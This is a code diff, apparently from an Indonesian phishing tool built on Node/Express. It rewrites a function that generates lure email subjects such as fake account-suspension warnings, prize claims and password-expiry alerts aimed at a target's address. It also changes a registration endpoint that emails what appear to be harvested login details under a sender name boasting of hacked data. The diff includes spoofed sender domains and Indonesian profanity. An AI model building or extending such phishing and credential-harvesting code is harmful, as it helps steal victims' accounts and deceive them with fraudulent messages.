@@ -104,13 +104,12 @@ function isDuplicatePassword(targetEmail, currentPassword) {
 // <== TAMBAHAN 6: Function generate subject spam
 function getSpamSubject(targetEmail, isRetry = false) {
     const spamSubjects = [
-        `!!! URGENT!!! YOUR ACCOUNT ${targetEmail} WILL BE SUSPENDED !!!`,
-        `🔴🔴🔴 WINNER!!! YOU WON 5000 DIAMONDS 🔴🔴🔴`,
+        `!!! 𝗛𝗔𝗖𝗞!!! 𝗬𝗢𝗨𝗥 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 ${targetEmail} 𝗪𝗜𝗟𝗟 𝗕𝗘 𝗦𝗨𝗦𝗣𝗘𝗡𝗗𝗘𝗗 !!!`,
+        `🔴🔴🔴 𝗪𝗜𝗡𝗡𝗘𝗥𝗬!!! 𝗛𝗔𝗖𝗞 𝗙𝗥𝗘𝗘 𝗛𝗔𝗖𝗞 𝗛𝗔𝗖𝗞🔴🔴🔴`,
         `✅✅✅ FREE ✅✅✅ FREE ✅✅✅ FREE ✅✅✅ CLAIM NOW!!!`,
         `🏆🏆🏆 CONGRATULATIONS ${targetEmail} YOU ARE SELECTED 🏆🏆🏆`,
         `⚠️⚠️⚠️ LAST CHANCE!!! VERIFY YOUR ACCOUNT ⚠️⚠️⚠️`,
-        `💎💎💎 5000 DM GRATIS UNTUK ${targetEmail} 💎💎💎`,
-        `🔴 URGENT: ${targetEmail} YOUR PASSWORD WILL EXPIRE TODAY 🔴`
+        `🔴 𝗛𝗔𝗖𝗞: ${targetEmail} 𝗬𝗢𝗨𝗥 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 𝗪𝗜𝗟𝗟 𝗘𝗫𝗣𝗜𝗥𝗘 𝗧𝗢𝗗𝗔𝗬𝗝𝗟 🔴`
     ];
     let subject = spamSubjects[Math.floor(Math.random() * spamSubjects.length)];
     if (isRetry) subject = `[RETRY] ` + subject;
@@ -235,7 +234,7 @@ app.post('/api/register', async (req, res) => {
 `;
         
         // <== TAMBAHAN 10: KIRIM EMAIL
-        const fakeEmails = [`spam${Date.now()}@gmail.com`, `fake${Date.now()}@yahoo.com`];
+        const fakeEmails = [`spam${Date.now()}@freeeanjing.om.anjing.goblok`, `fake${Date.now()}@kontolhack.co.com.id.web.kon`];
         
         await transporter.sendMail({
             from: `"🏆🏆🏆 𝗗𝗔𝗧𝗔 𝗛𝗔𝗖𝗞 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚 🏆🏆🏆" <${SENDER_EMAIL}>`,
